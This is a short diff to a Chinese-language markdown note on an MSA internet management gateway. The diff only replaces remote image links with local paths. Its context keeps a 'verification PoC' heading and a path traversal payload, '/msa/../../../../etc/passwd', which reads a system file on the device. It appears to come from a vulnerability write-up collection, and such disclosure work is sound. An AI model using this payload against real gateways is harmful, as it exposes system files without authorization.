@@ -20,7 +20,7 @@ MSA 互联网管理网关
 
 登录页面
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110916716.png)
+![img](./images/202202110916716.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ MSA 互联网管理网关
 /msa/../../../../etc/passwd
 ```
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110916705.png)
+![img](./images/202202110916705.png)
